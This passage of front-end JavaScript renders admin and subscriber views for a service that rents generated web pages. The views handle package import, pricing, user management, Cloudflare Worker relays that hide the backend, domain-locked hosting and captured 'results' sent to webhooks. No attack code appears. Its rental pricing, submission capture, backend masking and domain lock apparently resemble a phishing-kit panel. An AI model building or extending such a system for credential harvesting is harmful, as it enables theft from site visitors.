          <small>step 4</small>
          <h3>CSS normalization</h3>
          <label><span>Package wrapper</span><input type="text" value=".package-new-import"></label>
          <label><span>Brand token</span><input type="text" value="#7CFFB2"></label>
          <label><span>Detected CSS</span><textarea>Inline styles: 8
External files: ${detectedFiles.filter((file) => file.endsWith(".css")).length || 1}
Scoped selectors: ready</textarea></label>
        </article>

        <article class="security-panel package-form">
          <small>step 5</small>
          <h3>Publish settings</h3>
          <label><span>Package ID</span><input type="text" value="${isGithub ? "pkg_github_import" : "pkg_uploaded_import"}"></label>
          <label><span>Package name</span><input type="text" value="${isGithub ? "GitHub Imported Page" : "Uploaded Page Package"}"></label>
          <label><span>Slug</span><input type="text" value="${isGithub ? "github-imported-page" : "uploaded-page-package"}"></label>
          <label><span>Weekly price</span><input type="text" value="$25/week"></label>
          <label><span>Billing periods</span><input type="text" value="daily:5, weekly:25, biweekly:45, monthly:80"></label>
          <label><span>Status</span><select><option>Draft</option><option>Review</option><option>Published</option></select></label>
          <div class="admin-actions">
            <button type="button" data-admin-action="IMPORT DRAFT SAVED">Save draft</button>
            <button type="button" data-admin-action="IMPORT PREVIEW GENERATED">Preview</button>
            <button type="button" data-admin-action="IMPORT READY FOR REVIEW">Publish</button>
          </div>
        </article>

        <article class="security-panel package-preview-card">
          <small>preview</small>
          <h3>Generated package preview</h3>
          <div style="--package-accent: #7CFFB2" class="mini-page-preview">
            <span>${sourceLabel}</span>
            <strong>Mapped flow ready</strong>
            <button type="button">Sample CTA</button>
          </div>
        </article>

        <article class="security-panel">
          <small>model output</small>
          <h3>Package record shape</h3>
          <div class="admin-code-sample">
            <code>id / slug / name / status / version</code>
            <code>sourceType / repo / screens / assets / cssFiles / inlineCssBlocks</code>
            <code>billingPeriods / tokens / createdAt / updatedAt</code>
          </div>
        </article>

        ${isGithub ? `
          <article class="security-panel">
            <small>github scan result</small>
            <h3>Repository connection</h3>
            <div class="admin-code-sample" data-github-result>
              <code>API connection required: ${escapeHtml(apiBase())}</code>
              <code>Public repos work directly. Private repos need GITHUB_TOKEN on Render.</code>
            </div>
          </article>
        ` : ""}
      </div>
    </section>
  `;

  statusText.textContent = `${sourceLabel.toUpperCase()} IMPORT WIZARD READY`;
  topbarTitle.textContent = "Import Wizard";
}

function renderAdminPackageEditor(packageSlug = "page-a") {
  activeFlowSlug = null;
  const page = getAdminPackage(packageSlug);
  if (!page) {
    preview.innerHTML = `
      <section class="app-view">
        <div class="view-heading">
          <small>package editor</small>
          <h2>No package loaded</h2>
          <p>Create or import a package first. The editor now only opens real package records from the API.</p>
        </div>
        ${viewNav([routeButton("#admin", "Back to admin", "primary"), routeButton("#admin-import-github", "Import GitHub")])}
        ${emptyState("No package record", "Publish a package from the admin studio to edit its screens, CSS, pricing, and release settings.", "#admin")}
      </section>
    `;
    statusText.textContent = "PACKAGE RECORD REQUIRED";
    topbarTitle.textContent = "Package Editor";
    return;
  }

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>package editor</small>
        <h2>${page.name}</h2>
        <p>Edit package details, map imported files, tune CSS/design tokens, and prepare the next publishable version.</p>
      </div>
      ${viewNav([
        routeButton("#admin", "&#8592; Admin Studio", "primary"),
        routeButton("#pages", "Marketplace"),
        routeButton("#my-pages", "My Pages")
      ])}

      <article class="admin-package-card">
        <div>
          <small>${page.status}</small>
          <h3>${page.name} ${page.version}</h3>
          <p>${page.source} / ${page.cssMode} / ${page.repo}</p>
        </div>
        <div class="admin-actions">
          <button type="button" data-admin-action="${page.name.toUpperCase()} DRAFT SAVED">Save draft</button>
          <button type="button" data-admin-action="${page.name.toUpperCase()} PREVIEW GENERATED">Preview</button>
          <button type="button" data-admin-action="${page.name.toUpperCase()} VERSION PUBLISHED">Publish</button>
        </div>
      </article>

      <div class="package-editor-grid">
        <article class="security-panel package-form">
          <small>package details</small>
          <h3>Listing settings</h3>
          <label><span>Package ID</span><input type="text" value="${page.id}"></label>
          <label><span>Package name</span><input type="text" value="${page.name}"></label>
          <label><span>Package type</span><input type="text" value="${page.type}"></label>
          <label><span>Weekly price</span><input type="text" value="${page.price}"></label>
          <label><span>Version</span><input type="text" value="${page.version}"></label>
          <label><span>Source type</span><input type="text" value="${page.sourceType}"></label>
          <label><span>Source path</span><input type="text" value="${page.repo}"></label>
          <label><span>Status</span><select><option>${page.status}</option><option>Draft</option><option>Review</option><option>Published</option></select></label>
        </article>

        <article class="security-panel package-form">
          <small>billing periods</small>
          <h3>Subscription prices</h3>
          <label><span>Daily</span><input type="text" value="$${page.billingPeriods.daily}"></label>
          <label><span>Weekly</span><input type="text" value="$${page.billingPeriods.weekly}"></label>
          <label><span>Biweekly</span><input type="text" value="$${page.billingPeriods.biweekly}"></label>
          <label><span>Monthly</span><input type="text" value="$${page.billingPeriods.monthly}"></label>
        </article>

        <article class="security-panel package-form">
          <small>design tokens</small>
          <h3>CSS controls</h3>
          <label><span>Brand color</span><input type="text" value="${page.tokens.brand}"></label>
          <label><span>Font family</span><input type="text" value="${page.tokens.font}"></label>
          <label><span>Border radius</span><input type="text" value="${page.tokens.radius}"></label>
          <label><span>Custom CSS override</span><textarea>.package-${page.slug} .button { background: var(--brand); }</textarea></label>
        </article>

        <article class="security-panel">
          <small>file mapping</small>
          <h3>Imported screens</h3>
          <div class="file-map-list">
            ${page.screens.map((screen, index) => `
              <div>
                <strong>${String(index + 1).padStart(2, "0")}</strong>
                <span>${screen}</span>
                <em>${index === 0 ? "Entry" : index === page.screens.length - 1 ? "Final" : "Screen"}</em>
                <button type="button" data-admin-action="${screen.toUpperCase()} MAPPING EDITED">Map</button>
              </div>
            `).join("")}
          </div>
        </article>

        <article class="security-panel">
          <small>assets and css files</small>
          <h3>Source inventory</h3>
          <div class="feature-row">
            ${page.assets.map((asset) => `<span>${asset}</span>`).join("")}
            ${page.cssFiles.map((cssFile) => `<span>${cssFile}</span>`).join("")}
            <span>${page.inlineCssBlocks} inline CSS blocks</span>
          </div>
        </article>

        <article class="security-panel">
          <small>css inspection</small>
          <h3>Normalization status</h3>
          <div class="pipeline-steps">
            <span class="done">HTML parsed</span>
            <span class="done">${page.cssMode}</span>
            <span class="${page.design === "Needs review" ? "active" : "done"}">${page.design}</span>
            <span>Preview required</span>
            <span>Publish ready</span>
          </div>
        </article>

        <article class="security-panel">
          <small>version history</small>
          <h3>Release controls</h3>
          <div class="traffic-log">
            <div><span>${page.version}</span><strong>Current</strong><em>${page.status}</em><small>Latest working version for this package.</small></div>
            <div><span>new</span><strong>Updated</strong><em>${page.updatedAt.slice(0, 10)}</em><small>Last package metadata update.</small></div>
            <div><span>old</span><strong>Created</strong><em>${page.createdAt.slice(0, 10)}</em><small>Original package import date.</small></div>
            <div><span>prev</span><strong>Rollback</strong><em>Ready</em><small>Keep the previous package build available for recovery.</small></div>
            <div><span>next</span><strong>Draft</strong><em>Queued</em><small>Save edits as the next version before publishing.</small></div>
          </div>
        </article>

        <article class="security-panel package-preview-card">
          <small>preview</small>
          <h3>Design match preview</h3>
          <div style="--package-accent: ${page.tokens.brand}" class="mini-page-preview">
            <span>${page.name}</span>
            <strong>${page.cssMode}</strong>
            <button type="button">Sample CTA</button>
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = `${page.name.toUpperCase()} PACKAGE EDITOR OPEN`;
  topbarTitle.textContent = `${page.name} Editor`;
}

function renderAdminUsers() {
  activeFlowSlug = null;
  const activeCount = adminUsers.filter((user) => user.status === "Active").length;
  const reviewCount = adminUsers.filter((user) => user.status === "Review").length;

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>admin user manager</small>
        <h2>Users and access</h2>
        <p>Manage user accounts, wallet balances, active page subscriptions, roles, access status, and IP-level security actions.</p>
      </div>
      ${viewNav([
        routeButton("#admin", "&#8592; Admin Studio", "primary"),
        routeButton("#wallet", "Wallet"),
        routeButton("#my-pages", "My Pages")
      ])}

      <div class="summary-grid">
        <article><small>Total users</small><b>${String(adminUsers.length).padStart(2, "0")}</b><span>User accounts</span></article>
        <article><small>Active</small><b>${String(activeCount).padStart(2, "0")}</b><span>Allowed access</span></article>
        <article><small>Review</small><b>${String(reviewCount).padStart(2, "0")}</b><span>Needs attention</span></article>
        <article><small>Managed pages</small><b>${String(adminUsers.reduce((sum, user) => sum + user.pages, 0)).padStart(2, "0")}</b><span>Across users</span></article>
      </div>

      <article class="admin-package-card">
        <div>
          <small>account options</small>
          <h3>Controls available per user</h3>
          <p>View user pages, adjust wallet, change role, pause renewals, reset login, suspend account, ban IP, or whitelist IP.</p>
        </div>
        <div class="admin-actions">
          <button type="button" data-admin-action="NEW USER INVITE READY">Invite user</button>
          <button type="button" data-admin-action="USER EXPORT QUEUED">Export users</button>
          <button type="button" data-admin-action="BULK REVIEW OPENED">Bulk review</button>
        </div>
      </article>

      <article class="admin-table-card">
        <div class="builder-heading">
          <div>
            <small>user directory</small>
            <h3>Accounts</h3>
          </div>
          <button type="button" data-admin-action="USER DIRECTORY REFRESHED">Refresh</button>
        </div>
        <div class="user-manager-list">
          ${adminUsers.map((user) => `
            <article>
              <div class="user-avatar">${user.name.split(" ").map((part) => part[0]).join("").slice(0, 2)}</div>
              <div class="user-copy">
                <strong>${user.name}</strong>
                <span>${user.email}</span>
              </div>
              <div class="user-tags">
                <span>${user.role}</span>
                <span>${user.status}</span>
                <span>${user.wallet}</span>
                <span>${user.pages} pages</span>
                <span>${user.plan}</span>
                <span>${user.risk}</span>
                <span>IP ${user.ip}</span>
              </div>
              <div class="user-actions">
                <button type="button" data-admin-action="${user.name.toUpperCase()} PAGES OPENED">Pages</button>
                <button type="button" data-admin-action="${user.name.toUpperCase()} WALLET ADJUSTMENT OPENED">Wallet</button>
                <button type="button" data-admin-action="${user.name.toUpperCase()} ROLE UPDATED">Role</button>
                <button type="button" data-admin-action="${user.name.toUpperCase()} LOGIN RESET SENT">Reset</button>
                <button type="button" data-admin-action="${user.ip} BANNED">Ban IP</button>
                <button type="button" data-admin-action="${user.name.toUpperCase()} ACCOUNT SUSPENDED">Suspend</button>
              </div>
            </article>
          `).join("")}
        </div>
      </article>

      <div class="admin-grid">
        <article class="security-panel">
          <small>role options</small>
          <h3>Access levels</h3>
          <div class="admin-rule-list">
            <div><strong>01</strong><span>Subscriber: can subscribe, configure owned pages, download index.html.</span></div>
            <div><strong>02</strong><span>Support: can view users and help with domains/security but cannot publish packages.</span></div>
            <div><strong>03</strong><span>Admin: can manage packages, users, wallet corrections, and publishing.</span></div>
          </div>
        </article>

        <article class="security-panel">
          <small>security options</small>
          <h3>User safety controls</h3>
          <div class="feature-row">
            <span>Suspend account</span>
            <span>Ban IP</span>
            <span>Whitelist IP</span>
            <span>Reset login</span>
            <span>Pause renewals</span>
            <span>Force CAPTCHA</span>
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = "ADMIN USER MANAGER READY";
  topbarTitle.textContent = "User Manager";
}

function pageTrafficCount(page) {
  const logCount = page.securityConfig?.trafficLog?.length;
  if (Number.isFinite(logCount) && logCount > 0) return logCount;
  const numericTraffic = String(page.traffic || "").match(/\d+/);
  return numericTraffic ? Number(numericTraffic[0]) : 0;
}

function pageLaunchReadiness(page) {
  const checks = [
    Boolean(page.subscription?.billingPeriod),
    Boolean(page.hostingConfig?.domain || page.domain),
    Boolean(page.hostingConfig?.serverIp),
    Boolean(page.generatedFile?.lastGeneratedAt || page.generatedFile?.version)
  ];
  const passed = checks.filter(Boolean).length;
  return {
    passed,
    total: checks.length,
    percent: Math.round((passed / checks.length) * 100)
  };
}

function ownedPageCard(page, index) {
  const readiness = pageLaunchReadiness(page);
  const hosting = page.hostingConfig || {};
  const liveStatus = hosting.liveStatus || (hosting.verified ? "Live" : hosting.serverIp ? "Ready to verify" : "Setup needed");
  const domain = hosting.domain || page.domain || "No domain connected";
  const billing = page.subscription?.billingPeriod
    ? `${billingLabel(page.subscription.billingPeriod)} / ${formatMoney(page.subscription.renewalPrice || 0)}`
    : "Billing not set";
  const renewal = page.subscription?.adminFreeSubscription
    ? "Admin free access"
    : page.subscription?.renewalDate || "Renewal not scheduled";
  const securityLabel = page.securityConfig?.captcha ? "Captcha on" : "Captcha off";
  const trafficCount = pageTrafficCount(page);
  const resultCount = page.results?.length || 0;
  const generatedLabel = page.generatedFile?.lastGeneratedAt ? "Generated" : page.generatedFile?.version || "Not generated";

  return `
    <article class="owned-page-card my-page-card">
      <header class="my-page-head">
        <div class="owned-main">
          <small>${escapeHtml(page.status || "active")}</small>
          <h3>${escapeHtml(page.name)}</h3>
          <p>${escapeHtml(domain)}</p>
        </div>
        <div class="my-page-score" aria-label="${readiness.percent}% launch ready">
          <strong>${readiness.percent}%</strong>
          <span>${readiness.passed}/${readiness.total} ready</span>
        </div>
      </header>

      <div class="my-page-status-grid">
        <div><span>Launch</span><strong>${escapeHtml(liveStatus)}</strong></div>
        <div><span>Plan</span><strong>${escapeHtml(billing)}</strong></div>
        <div><span>Results</span><strong>${resultCount}</strong></div>
        <div><span>Traffic</span><strong>${trafficCount}</strong></div>
      </div>

      <details class="my-page-tools" ${index === 0 ? "open" : ""}>
        <summary>
          <span>Manage page</span>
          <strong>${escapeHtml(renewal)} / ${escapeHtml(securityLabel)} / ${escapeHtml(generatedLabel)}</strong>
        </summary>
        <div class="my-page-tool-grid" aria-label="${escapeHtml(page.name)} management tools">
          <section>
            <h4>Launch</h4>
            <button type="button" data-go-live="${escapeHtml(page.slug)}">&#128640; Go Live</button>
            <button type="button" data-config-page="${escapeHtml(page.slug)}">&#9881; Config</button>
            <button type="button" data-security="${escapeHtml(page.slug)}" data-security-tab="domains">&#127760; Domain</button>
          </section>
          <section>
            <h4>Operate</h4>
            <button type="button" data-config-page="${escapeHtml(page.slug)}">&#9881; Config</button>
            <button type="button" data-security="${escapeHtml(page.slug)}" data-security-tab="security">&#128737; Security</button>
            <button type="button" data-results="${escapeHtml(page.slug)}">&#128193; Results</button>
          </section>
          <section>
            <h4>Export</h4>
            <button type="button" data-download-index="${escapeHtml(page.slug)}">&#11015; index.html</button>
            <button type="button" data-security="${escapeHtml(page.slug)}" data-security-tab="traffic">&#128200; Traffic</button>
            <button type="button" data-route="#wallet">&#128179; Billing</button>
          </section>
        </div>
      </details>
    </article>
  `;
}

function renderMyPages() {
  activeFlowSlug = null;
  const liveCount = ownedPages.filter((page) => page.hostingConfig?.verified || page.hostingConfig?.liveStatus === "Live").length;
  const resultTotal = ownedPages.reduce((sum, page) => sum + (page.results?.length || 0), 0);
  const captchaCount = ownedPages.filter((page) => page.securityConfig?.captcha).length;
  const trafficTotal = ownedPages.reduce((sum, page) => sum + pageTrafficCount(page), 0);

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>my pages</small>
        <h2>Page control room</h2>
        <p>Manage every subscribed page from one place: launch setup, configuration, security rules, saved results, traffic, billing, and the final index.html file.</p>
      </div>
      ${viewNav([
        routeButton("#dashboard", "&#8592; Dashboard"),
        routeButton("#pages", "Browse pages"),
        routeButton("#wallet", "Wallet")
      ])}

      <div class="summary-grid my-pages-kpis">
        <article><small>Owned pages</small><b>${String(ownedPages.length).padStart(2, "0")}</b><span>Active subscriptions</span></article>
        <article><small>Live pages</small><b>${String(liveCount).padStart(2, "0")}</b><span>Verified hosting</span></article>
        <article><small>Results</small><b>${String(resultTotal).padStart(2, "0")}</b><span>Saved submissions</span></article>
        <article><small>Traffic</small><b>${String(trafficTotal).padStart(2, "0")}</b><span>Tracked visits</span></article>
      </div>

      <article class="my-pages-brief">
        <div>
          <small>workspace flow</small>
          <h3>Subscribe, configure, connect hosting, then export.</h3>
          <p>Each card below is one owned page. Open its management panel when you need tools, keep it closed when you only want the live status.</p>
        </div>
        <div class="feature-row">
          <span>${captchaCount} captcha enabled</span>
          <span>${ownedPages.filter((page) => page.subscription?.autoRenew).length} auto-renewing</span>
          <span>${ownedPages.filter((page) => page.generatedFile?.lastGeneratedAt).length} generated files</span>
        </div>
      </article>

      <div class="owned-list">
        ${ownedPages.length ? ownedPages.map(ownedPageCard).join("") : emptyState("No subscribed pages yet", "Subscribe to a published page package, then your live page controls will appear here.", "#pages")}
      </div>
    </section>
  `;
  statusText.textContent = "MY PAGES MANAGEMENT ACTIVE";
  topbarTitle.textContent = "My Pages";
}

function renderGoLiveCenter(pageSlug = "page-a") {
  activeFlowSlug = null;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const hosting = page.hostingConfig || {};
  const verifiedLabel = hosting.verified ? "Verified" : "Not verified";
  const liveStatus = hosting.liveStatus || "Setup required";
  const domain = hosting.domain || page.domain || "";
  const serverIp = hosting.serverIp || "";
  const hostingType = hosting.hostingType || "render-static-site";
  const isRenderStatic = hostingType === "render-static-site";
  const installPath = hosting.installPath || (isRenderStatic ? "root / public directory" : "public_html");
  const connectionType = hosting.connectionType || "cloudflare-worker";
  const relaySecret = hosting.relaySecret || "";
  const relayTarget = hosting.relayTarget || apiBase();
  const cloudflare = hosting.cloudflare || {};
  const managedInstalled = Boolean(cloudflare.managed && cloudflare.routePattern);
  const workerRoute = domain ? `${domain}/api/*` : "clientdomain.com/api/*";
  const hasDomain = Boolean(domain);
  const hasRenderOrigin = Boolean(serverIp);
  const hasRelayTarget = Boolean(relayTarget);
  const hasRelaySecret = Boolean(relaySecret);
  const hasWorkerRoute = managedInstalled || (hasDomain && hasRelaySecret);
  const hasVerified = Boolean(hosting.verified || hosting.relayVerified);
  const readyToDownload = hasDomain && hasRelaySecret && hasRelayTarget;
  const displayDomain = domain || "clientdomain.com";
  const workerScript = cloudflareWorkerScript({
    ...page,
    hostingConfig: { ...hosting, domain, relaySecret, relayTarget, connectionType }
  });

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>go live setup</small>
        <h2>${page.name} activation</h2>
        <p>Follow the steps in order. The page is strict live-domain only: it loads on ${displayDomain}, while backend traffic stays behind a domain relay.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#config-${page.slug}`, "Config"),
        routeButton(`#security-${page.slug}:domains`, "Domains")
      ])}

      <div class="summary-grid">
        <article><small>Live status</small><b>${liveStatus}</b><span>${verifiedLabel}</span></article>
        <article><small>Domain</small><b>${domain || "Unset"}</b><span>Allowed host</span></article>
        <article><small>Hosting</small><b>${hostingTypeLabel(hostingType)}</b><span>${hosting.relayVerified ? "Verified" : "Needs check"}</span></article>
        <article><small>Route</small><b>${workerRoute}</b><span>Worker path</span></article>
      </div>

      <div class="wizard-progress go-live-progress">
        <span class="${setupStepClass(hasDomain, true)}">1 Domain</span>
        <span class="${setupStepClass(hasRenderOrigin, hasDomain && !hasRenderOrigin)}">2 Render</span>
        <span class="${setupStepClass(hasRelaySecret, hasDomain && !hasRelaySecret)}">3 Secret</span>
        <span class="${setupStepClass(hasWorkerRoute, hasRelaySecret && !hasWorkerRoute)}">4 Worker</span>
        <span class="${setupStepClass(hasVerified, hasWorkerRoute && !hasVerified)}">5 Verify</span>
        <span class="${setupStepClass(page.generatedFile?.lastGeneratedAt, readyToDownload)}">6 Download</span>
      </div>

      <article class="my-pages-brief">
        <div>
          <small>local testing note</small>
          <h3>Render hosts the page. Cloudflare hides the backend route.</h3>
          <p>The visitor only calls https://${displayDomain}/api/*. Cloudflare relays those calls to the app backend without exposing the backend URL in the downloaded index.html.</p>
        </div>
        <div class="feature-row">
          <span>Live URL: https://${displayDomain}/</span>
          <span>Raw Render URL blocked</span>
          <span>API masked by Worker</span>
        </div>
      </article>

      <div class="go-live-steps">
        <article class="security-panel package-form go-live-step-card ${hasDomain ? "is-complete" : "is-active"}">
          <small>step 1</small>
          <h3>Set the live domain</h3>
          <p>This is the only hostname where the downloaded page is allowed to run.</p>
          <label><span>Domain name</span><input type="text" data-hosting-field="domain" value="${domain}" placeholder="example.com"></label>
          <label>
            <span>Connection type</span>
            <select data-hosting-field="connectionType">
              ${[
                ["cloudflare-worker", "Cloudflare Worker Relay"],
                ["direct-api", "Direct API"],
                ["server-proxy", "Server proxy"]
              ].map(([value, label]) => `<option value="${value}" ${connectionType === value ? "selected" : ""}>${label}</option>`).join("")}
            </select>
          </label>
          <div class="admin-actions">
            <button type="button" data-save-hosting="${page.slug}">Save domain</button>
          </div>
        </article>

        <article class="security-panel package-form go-live-step-card ${hasRenderOrigin ? "is-complete" : hasDomain ? "is-active" : ""}">
          <small>step 2</small>
          <h3>Create the Render Static Site</h3>
          <p>Upload or deploy the final index.html to Render Static Site, then connect ${displayDomain} as the custom domain in Render.</p>
          <label>
            <span>Hosting type</span>
            <select data-hosting-field="hostingType">
              ${hostingTypeOptions(hostingType)}
            </select>
          </label>
          <label><span>${isRenderStatic ? "Render origin URL (not live URL)" : "cPanel or server IP"}</span><input type="text" data-hosting-field="serverIp" value="${serverIp}" placeholder="${isRenderStatic ? "https://your-static-site.onrender.com" : "123.45.67.89"}"></label>
          <label><span>${isRenderStatic ? "Render publish directory" : "Install path"}</span><input type="text" data-hosting-field="installPath" value="${escapeHtml(installPath)}" placeholder="${isRenderStatic ? "root or public" : "public_html"}"></label>
          <div class="admin-actions">
            <button type="button" data-save-hosting="${page.slug}">Save Render setup</button>
          </div>
        </article>

        <article class="security-panel go-live-step-card ${hasRelaySecret ? "is-complete" : hasDomain ? "is-active" : ""}">
          <small>step 3</small>
          <h3>Generate relay secret</h3>
          <p>This secret is stored in the Cloudflare Worker only. It lets your backend reject direct runtime traffic.</p>
          <div class="traffic-log">
            <div><span>01</span><strong>Secret</strong><em>${relaySecret ? "Saved" : "Needed"}</em><small>${relaySecret ? "Ready for Worker install." : "Generate before copying Worker code."}</small></div>
            <div><span>02</span><strong>Relay</strong><em>Hidden backend</em><small>Cloudflare forwards runtime calls privately.</small></div>
          </div>
          <div class="admin-actions">
            <button type="button" data-generate-relay-secret="${page.slug}">${relaySecret ? "Regenerate secret" : "Generate secret"}</button>
          </div>
        </article>

        <article class="security-panel package-form go-live-step-card ${hasWorkerRoute ? "is-complete" : hasRelaySecret ? "is-active" : ""}">
          <small>step 4</small>
          <h3>Install Cloudflare relay</h3>
          <p>Paste a limited Cloudflare token once. The app installs the Worker and route for <strong>${workerRoute}</strong>, then stores only deployment status.</p>
          <label><span>Cloudflare account ID</span><input type="text" data-cloudflare-field="accountId" value="${escapeHtml(cloudflare.accountId || "")}" placeholder="Account ID from Cloudflare dashboard"></label>
          <label><span>Cloudflare API token</span><input type="password" data-cloudflare-field="apiToken" value="" placeholder="Used once. Not saved by the app."></label>
          <label><span>Worker script name</span><input type="text" data-cloudflare-field="scriptName" value="${escapeHtml(cloudflare.scriptName || `deuce-${displayDomain.replace(/[^a-z0-9-]/gi, "-").toLowerCase()}`)}"></label>
          <div class="admin-code-sample">
            <code>Managed route: ${escapeHtml(cloudflare.routePattern || workerRoute)}</code>
            <code>Status: ${managedInstalled ? "Installed by app" : "Waiting for managed install"}</code>
            <code>Browser calls: https://${displayDomain}/api/*</code>
          </div>
          <div class="admin-actions">
            <button type="button" data-install-cloudflare="${page.slug}" ${hasDomain && hasRelaySecret ? "" : "disabled"}>Install Worker route</button>
            <button type="button" data-verify-cloudflare="${page.slug}" ${hasDomain ? "" : "disabled"}>Verify zone</button>
          </div>
          <details class="advanced-worker">
            <summary>Advanced manual Worker</summary>
            <p>Manual install is only for debugging. Managed install keeps normal users away from Worker code.</p>
            <textarea class="worker-code-box" readonly data-worker-code="${page.slug}">${escapeHtml(workerScript)}</textarea>
            <div class="admin-actions">
              <button type="button" data-copy-worker="${page.slug}" ${relaySecret ? "" : "disabled"}>Copy Worker script</button>
            </div>
          </details>
        </article>

        <article class="security-panel go-live-step-card ${hasVerified ? "is-complete" : hasWorkerRoute ? "is-active" : ""}">
          <small>step 5</small>
          <h3>Connect custom domain</h3>
          <p>In Cloudflare DNS, point ${displayDomain} to the Render Static Site custom domain setup. The raw Render URL stays only as the origin.</p>
          <div class="admin-rule-list">
            ${isRenderStatic ? `
              <div><strong>1</strong><span>Create a Render Static Site for this page.</span></div>
              <div><strong>2</strong><span>Connect ${displayDomain} as the custom domain in Render.</span></div>
              <div><strong>3</strong><span>In Cloudflare, keep the DNS record proxied so Worker route ${workerRoute} runs.</span></div>
              <div><strong>4</strong><span>The raw Render URL is unauthorized by the generated page.</span></div>
            ` : `
              <div><strong>1</strong><span>Point the domain to the hosting account.</span></div>
              <div><strong>2</strong><span>Keep the Worker route active in Cloudflare.</span></div>
              <div><strong>3</strong><span>Visitors should open https://${displayDomain}/.</span></div>
              <div><strong>4</strong><span>Do not use alternate hostnames for the live page.</span></div>
            `}
          </div>
          <div class="admin-actions">
            <button type="button" data-verify-hosting="${page.slug}">Mark connection verified</button>
          </div>
        </article>

        <article class="security-panel go-live-step-card ${page.generatedFile?.lastGeneratedAt ? "is-complete" : readyToDownload ? "is-active" : ""}">
          <small>step 6</small>
          <h3>Download final index.html</h3>
          <p>Download after the domain, relay secret, and Worker route are set. Upload this file to the Render Static Site root/publish directory.</p>
          <div class="admin-rule-list">
            ${isRenderStatic ? `
              <div><strong>1</strong><span>Download the generated index.html from this step.</span></div>
              <div><strong>2</strong><span>Upload or commit it to the Render Static Site publish folder: ${installPath || "root"}.</span></div>
              <div><strong>3</strong><span>Connect ${domain || "clientdomain.com"} as the custom domain in Render.</span></div>
              <div><strong>4</strong><span>Visitors must use ${domain || "clientdomain.com"} only. The raw Render URL is treated as unauthorized.</span></div>
            ` : `
              <div><strong>1</strong><span>Download the generated index.html from this step.</span></div>
              <div><strong>2</strong><span>Go to ${installPath || "public_html"} or the domain document root.</span></div>
              <div><strong>3</strong><span>Upload the generated index.html. Visitors should open https://${domain || "clientdomain.com"}/.</span></div>
              <div><strong>4</strong><span>Add DirectoryIndex and /index.html redirect rules if the host exposes the filename.</span></div>
            `}
          </div>
          <div class="admin-actions">
            <button type="button" data-download-index="${page.slug}" ${readyToDownload ? "" : "disabled"}>Download index.html</button>
          </div>
        </article>
      </div>
    </section>
  `;

  statusText.textContent = `${page.name.toUpperCase()} HOSTING SETUP READY`;
  topbarTitle.textContent = `${page.name} Go Live`;
}

function renderUserConfigCenter(pageSlug = "page-a") {
  activeFlowSlug = null;
  const page = getPageBySlug(pageSlug);
  if (!page) {
    renderMissingPage();
    return;
  }
  const snapshot = {
    id: page.id,
    userId: page.userId,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    domain: page.domain,
    subscription: page.subscription,
    generatedFile: page.generatedFile,
    resultSettings: page.resultSettings,
    flow: page.flow,
    securityConfig: page.securityConfig
  };

  preview.innerHTML = `
    <section class="app-view">
      <div class="view-heading">
        <small>user config</small>
        <h2>${page.name} configuration</h2>
        <p>This is the subscriber-owned config record that controls billing, hosting, generated files, result capture, and page behavior.</p>
      </div>
      ${viewNav([
        routeButton("#my-pages", "&#8592; My Pages", "primary"),
        routeButton(`#security-${page.slug}:security`, "Security"),
        routeButton(`#results-${page.slug}`, "Results")
      ])}

      <div class="summary-grid">
        <article><small>User page ID</small><b>${page.id}</b><span>${page.userId}</span></article>
        <article><small>Package</small><b>${page.packageVersion}</b><span>${page.packageId}</span></article>
        <article><small>Renewal</small><b>$${page.subscription.renewalPrice}</b><span>${page.subscription.billingPeriod} / ${page.subscription.renewalDate}</span></article>
        <article><small>Generated</small><b>${page.generatedFile.version}</b><span>${page.generatedFile.downloadName}</span></article>
      </div>

      <div class="package-editor-grid">
        <article class="security-panel package-form">
          <small>subscription</small>
          <h3>Billing config</h3>
          <label>
            <span>Billing period</span>
            <select data-user-config="billingPeriod">
              ${["daily", "weekly", "biweekly", "monthly"].map((period) => `<option value="${period}" ${page.subscription.billingPeriod === period ? "selected" : ""}>${period}</option>`).join("")}
            </select>
          </label>
          <label><span>Renewal price</span><input type="number" min="0" data-user-config="renewalPrice" value="${page.subscription.renewalPrice}"></label>
          <label><span>Renewal date</span><input type="date" data-user-config="renewalDate" value="${page.subscription.renewalDate}"></label>
          <label class="toggle-row">
            <input type="checkbox" data-user-config="autoRenew" ${page.subscription.autoRenew ? "checked" : ""}>
            <span>Auto-renew from wallet</span>
          </label>
        </article>

        <article class="security-panel package-form">
          <small>hosting</small>
          <h3>Domain and generated file</h3>
          <label><span>Primary domain</span><input type="text" data-user-config="domain" value="${page.domain}"></label>
          <label><span>API base</span><input type="text" data-user-config="apiBase" value="${page.generatedFile.apiBase}"></label>
          <label><span>Download name</span><input type="text" data-user-config="downloadName" value="${page.generatedFile.downloadName}"></label>
          <label><span>Build version</span><input type="text" data-user-config="fileVersion" value="${page.generatedFile.version}"></label>
        </article>

        <article class="security-panel package-form">
          <small>results</small>
          <h3>Capture settings</h3>
          <label><span>Result webhook</span><input type="text" data-user-config="webhook" value="${page.resultSettings.webhook}"></label>
          <label><span>Retention days</span><input type="number" min="1" data-user-config="retentionDays" value="${page.resultSettings.retentionDays}"></label>
          <label class="toggle-row">
            <input type="checkbox" data-user-config="notifyOnResult" ${page.resultSettings.notifyOnResult ? "checked" : ""}>
            <span>Notify user when a new result arrives</span>
          </label>
          <div class="admin-actions">
            <button type="button" data-save-user-config="${page.slug}">Save user config</button>
            <button type="button" data-download-index="${page.slug}">Generate index.html</button>
          </div>
        </article>

        <article class="security-panel">
          <small>live config snapshot</small>
          <h3>Stored payload preview</h3>
          <div class="admin-code-sample">
            <code>${escapeHtml(JSON.stringify({ id: snapshot.id, userId: snapshot.userId, packageId: snapshot.packageId, packageVersion: snapshot.packageVersion }, null, 0))}</code>
            <code>${escapeHtml(JSON.stringify({ subscription: snapshot.subscription }, null, 0))}</code>
            <code>${escapeHtml(JSON.stringify({ generatedFile: snapshot.generatedFile }, null, 0))}</code>
            <code>${escapeHtml(JSON.stringify({ resultSettings: snapshot.resultSettings }, null, 0))}</code>
